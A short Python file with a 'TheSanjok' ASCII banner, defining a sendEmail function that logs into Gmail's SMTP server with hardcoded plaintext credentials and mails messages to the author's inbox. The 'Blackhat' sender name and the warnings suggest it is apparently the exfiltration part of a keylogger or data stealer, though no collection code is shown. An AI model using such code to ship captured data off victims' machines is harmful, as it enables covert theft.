#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
88888888888888              .d8888b.                   d8b        888      
    888    888             d88P  Y88b                  Y8P        888      
    888    888             Y88b.                                  888      
    888    88888b.  .d88b.  "Y888b.   8888b. 88888b.  8888 .d88b. 888  888 
    888    888 "88bd8P  Y8b    "Y88b.    "88b888 "88b "888d88""88b888 .88P 
    888    888  88888888888      "888.d888888888  888  888888  888888888K  
    888    888  888Y8b.    Y88b  d88P888  888888  888  888Y88..88P888 "88b 
    888    888  888 "Y8888  "Y8888P" "Y888888888  888  888 "Y88P" 888  888 
                                                       888                 
                                                      d88P                 
                                                    888P"                  
"""
#Copyright @TheSanjok


import smtplib, ssl

def sendEmail(message):
	smtp_server = "smtp.gmail.com"
	port = 587 
    #####################The Email with password is secured and is of no use, CAUTION!! Don't try to act smart#####################
	sender_email = "Blackhat_test@protonmail.ch"
	password = "test@123"
    ###########################DON'T ACT SMART#############################################
	receiver_email = "TheSanjok@protonmail.ch"

	context = ssl.create_default_context()

	try:
	    server = smtplib.SMTP(smtp_server,port)
	    server.ehlo() 
	    server.starttls(context=context) 
	    server.ehlo()
	    server.login(sender_email, password)
	    server.sendmail(sender_email, receiver_email, message)
	   
	except Exception as e:
	    print(e)
	finally:
	    server.quit()
